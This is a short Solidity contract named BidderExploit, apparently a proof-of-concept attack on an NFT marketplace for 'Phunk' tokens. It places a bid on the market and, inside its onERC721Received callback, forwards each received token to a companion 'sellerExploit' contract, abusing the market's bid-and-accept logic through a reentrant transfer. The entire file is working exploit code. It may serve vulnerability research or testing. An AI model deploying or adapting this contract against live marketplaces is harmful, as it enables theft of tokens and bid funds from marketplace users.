// SPDX-License-Identifier: MIT License
pragma solidity 0.8.10;

import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import "hardhat/console.sol";


interface ICPMarket {
    function enterBidForPhunk(uint256 phunkIndex) external payable;

    function acceptBidForPhunk(uint256 phunkIndex, uint256 minPrice) external;
}

contract BidderExploit {
    ICPMarket public market;
    address sellerExploit;

    constructor(ICPMarket market_, address sellerExploit_) {
        market = market_;
        sellerExploit = sellerExploit_;
    }

    function exploit(uint256 id) external payable {
        market.enterBidForPhunk{ value: msg.value }(id);
    }

    function onERC721Received(
        address,
        address,
        uint256 tokenId,
        bytes calldata
    ) external returns (bytes4) {
        IERC721(msg.sender).safeTransferFrom(address(this), sellerExploit, tokenId);
        return this.onERC721Received.selector;
    }
}